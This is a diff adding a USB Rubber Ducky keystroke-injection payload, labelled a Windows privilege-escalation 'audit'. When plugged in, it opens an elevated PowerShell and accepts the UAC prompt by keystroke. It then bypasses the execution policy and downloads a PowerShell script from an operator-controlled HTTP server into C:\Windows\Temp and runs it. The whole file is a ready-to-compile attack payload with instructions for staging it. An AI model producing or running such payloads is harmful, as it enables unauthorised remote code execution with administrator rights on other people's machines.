@@ -1,0 +1,53 @@
+REM ================================================================
+REM  USB Rubber Ducky — privesc-windows-quick
+REM  Description : Triggers a Windows privilege escalation audit by
+REM                downloading and running PrivescAudit-Windows.ps1
+REM                from the operator's HTTP server. Results saved
+REM                locally to C:\PrivescAudit\ on the target.
+REM                Operator must stage PrivescAudit-Windows.ps1 on
+REM                an accessible HTTP server before deployment.
+REM  Target OS   : Windows (PS 3.0+)
+REM  Author      : <operator>
+REM  Note        : Compile payload.txt → inject.bin with Payload Studio
+REM                https://payloadstudio.hak5.org
+REM ================================================================
+
+REM Configure operator server IP here
+VAR $SERVER = 192.168.1.100
+VAR $PORT = 8080
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    OS WINDOWS
+END_EXTENSION
+
+JITTER_ENABLED TRUE
+JITTER_MAX 30
+
+DELAY 1000
+
+REM Open Run dialog with elevated PowerShell
+GUI r
+DELAY 600
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 1200
+
+REM Accept UAC prompt
+ALT y
+DELAY 1000
+
+REM Download and execute audit script
+STRING $url = "http://
+STRING $SERVER
+STRING :
+STRING $PORT
+STRINGLN /PrivescAudit-Windows.ps1"; Set-ExecutionPolicy Bypass -Scope Process -Force; (New-Object Net.WebClient).DownloadFile($url, "C:\Windows\Temp\pea.ps1"); & "C:\Windows\Temp\pea.ps1"
+DELAY 500
+ENTER
+
+REM Allow audit to run (120s — adjust to match script runtime)
+DELAY 120000
+
+REM Close the elevated PS window
+STRING exit
+ENTER
